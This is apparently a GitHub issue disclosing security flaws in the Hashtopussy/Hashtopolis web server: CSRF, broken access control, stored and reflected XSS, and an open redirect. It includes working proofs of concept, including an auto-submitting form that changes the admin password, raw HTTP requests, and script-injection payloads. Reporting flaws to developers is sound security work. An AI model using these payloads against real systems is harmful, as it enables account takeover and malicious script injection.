## Description

[![@ghost](https://github.com/ghost.png?size=48)](/ghost)[ghost](/ghost)opened [on Jul 26, 2017](https://github.com/hashtopolis/server/issues/241#issue-245734627)

**CSRF (Admin Password Change)**

Cross-site request forgery protection is not available on sensitive forms. In the following example is possible to change the admin password:

```
<script>history.pushState('', '', '/')</script>
    <form action="http://localhost/hashtopussy/users.php?id=1 " method="POST">
      <input type="hidden" name="action" value="setPassword" />
      <input type="hidden" name="user" value="1" />
      <input type="hidden" name="pass" value="AdminOwn3d" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>

```

**Weak ACL**

Some pages and functionalities were not configured with a proper ACL. It was possible to perform the following actions as user role (20):

* Add voucher
* Delete voucher
* Add new agent using the generated voucher
* Create new hashcat release (Also vulnerable to Stored XSS affecting all users and roles)
* Delete new hashcat release

The following PoC can be used to create a new voucher with user role. Afterwards on "/hashtopussy/agents.php?new=true" is possible to show all the available vouchers.

```
POST /hashtopussy/agents.php?new=true HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Cookie: session=<valid_user_session>;
Connection: close

action=createVoucher&newvoucher=DzTc9akk

```

**Stored XSS (Readable by any user or role)**

By taking advantage of the already discussed "Weak ACL" issue, a user would be able to create a new Hashcat Release. The XSS is triggered inside hashcat.php on the following parameters: version, url and rootdir. The following PoC is available:

```
POST /hashtopussy/hashcat.php?new=true HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=---------------------------35464630613572079671329897993
Content-Length: 522
Cookie: session=<user_valid_session>; Connection: close

-----------------------------35464630613572079671329897993
Content-Disposition: form-data; name="action"

createRelease
-----------------------------35464630613572079671329897993
Content-Disposition: form-data; name="version"

1<script>alert(1)</script>
-----------------------------35464630613572079671329897993
Content-Disposition: form-data; name="url"

asd
-----------------------------35464630613572079671329897993
Content-Disposition: form-data; name="rootdir"

```

A stored XSS, readable by any role, may trigger a privilege escalation if executed by an administrative role.

**Open redirect (only with valid credentials)**

An informational issue for the developer: It was possible to fully control the “Location” response header during the login process, to force the session to be redirected to a third-party website. The following request will forward the session to Google:

```
POST /hashtopussy/login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close

fw=https://www.google.com&username=<valid_user>&password=<valid_pass>

```

**Reflective XSS (affecting only authenticated users)**

Some reflective XSS were identified in `hashes.php' page, affective the following parameters: hashlist, filter and display. The following example will trigger an alert message on screen to authenticated users:

`/hashtopussy/hashes.php?hashlist=1&filter=&display=<script>alert(1)</script>&page=1`

**Stored XSS (Only affecting user's session)**

This XSS can be triggered by adding a new notification. This attack is stored, but only readable by current user (who created it basically). The following PoC if available:

```
POST /hashtopussy/notifications.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Cookie: session=<User_Valid_Session>;
Connection: close

action=createNotification&actionType=deleteHashlist&tasks=ALL&agents=ALL&hashlists=ALL&notification=ChatBot&receiver=<script>alert(1);</script>

```
